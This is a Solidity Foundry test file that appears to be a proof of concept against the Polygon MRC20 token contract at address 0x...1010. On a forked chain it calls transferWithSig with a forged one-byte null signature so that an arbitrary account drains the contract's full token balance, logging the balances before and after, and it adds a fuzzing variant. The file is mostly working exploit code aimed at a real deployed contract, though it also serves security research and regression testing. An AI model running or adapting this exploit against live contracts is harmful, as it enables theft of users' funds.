// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../../src/PoC/PoC_Hack_b/IMRC20.sol";


contract MRC20Test is Test {
    // Notes: The block.number = 22156659
    IMRC20 public target;
    address public mrc20Address;

    address public nullAddress;
    bytes32 public nullBytes32OneByte = "0";
    bytes public nullBytesOneByte = "0";
    address public ana;
    address public kenat;

    function setUp() public {
        vm.createSelectFork(vm.envString("FOUNDRY_INFURA"));
        mrc20Address = address(0x0000000000000000000000000000000000001010);
        target = IMRC20(mrc20Address);

        ana = makeAddr("userAna");
        kenat = makeAddr("userKenat");
    }


    function testSteal() public {
        vm.rollFork(22156659);   
        uint256 kenatBalanceInit = target.balanceOf(kenat);
        uint256 maticBalanceInit = target.balanceOf(mrc20Address);
        console.log(" ");
        console.log("Initial Kenat balance: ", kenatBalanceInit);
        console.log("Initial Matic balance: ", maticBalanceInit);
    
        vm.prank(kenat);
        target.transferWithSig(nullBytesOneByte, maticBalanceInit, nullBytes32OneByte, block.timestamp + 10, kenat);

        uint256 kenatBalanceFin = target.balanceOf(kenat);
        uint256 maticBalanceFin = target.balanceOf(mrc20Address);
        console.log(" ");
        console.log("Final Kenat balance: ", kenatBalanceFin);
        console.log("Final Matic balance: ", maticBalanceFin);
    }

    function testFuzzingSteal(bytes calldata sig, bytes32 data) internal {
        vm.rollFork(22156659);  
        uint256 maticBalanceInit = target.balanceOf(mrc20Address);

    
        vm.prank(kenat);
        //vm.expectRevert('Insufficient amount');
        //target.withdraw(1 ether);
        target.transferWithSig(sig, maticBalanceInit, data, block.timestamp + 10, kenat);

        uint256 maticBalanceFin = target.balanceOf(mrc20Address);

        assertEq(maticBalanceInit, maticBalanceFin);
    }
}
